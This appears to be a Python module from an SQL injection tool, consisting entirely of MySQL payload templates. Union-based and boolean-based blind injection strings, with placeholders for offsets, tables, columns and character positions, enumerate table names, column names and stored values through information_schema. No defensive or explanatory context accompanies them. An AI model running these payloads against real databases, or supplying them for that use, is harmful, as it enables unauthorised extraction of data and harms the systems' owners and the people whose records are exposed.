

"""

payloads

"""

table_name_payloads_union_based = {
    "MySQL": [
        "'UNION SELECT (table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT {offset},1 -- "
    ]
}

column_name_payloads_union_based = {
    "MySQL": [
        "'UNION SELECT (column_name) FROM information_schema.columns WHERE table_name='{table}' LIMIT {offset},1 -- "
    ]

}

entity_name_payloads_union_based = {
    "MySQL": [
        "'UNION SELECT ({column}) FROM {table} LIMIT {offset},1-- "
    ]
}

table_name_payloads_boolean_based_blind = {
    "MySQL": [
		"'OR IF((SELECT MID(table_name,{position},1) FROM information_schema.tables WHERE table_schema=database() LIMIT {offset},1){operator}'{char}',1,0) -- ",
        "'OR IF((SELECT MID(table_name,{position},1) FROM information_schema.tables LIMIT {offset},1){operator}'{char}',1,0) -- "
    ]
}

column_name_payloads_boolean_based_blind = {
    "MySQL": [
        "'OR IF((SELECT MID(column_name,{position},1) FROM information_schema.columns WHERE table_name='{table}' LIMIT {offset},1){operator}'{char}',1,0) -- "
    ]
}

entity_name_payloads_boolean_based_blind = {
    "MySQL": [
        "'OR IF((SELECT MID({column},{position},1) FROM {table} LIMIT {offset},1){operator}'{char}',1,0) -- ",
        "'OR IF((SELECT MID({column},{position},1) FROM information_schema.columns WHERE table_name='{table}' LIMIT {offset},1){operator}'{char}',1,0) -- "

    ]
}

entity_count_payloads_boolean_based_blind = {
    "MySQL": [
        "'OR IF((SELECT COUNT({column}) FROM {table}){operator}{num},1,0) -- "
    ]
}
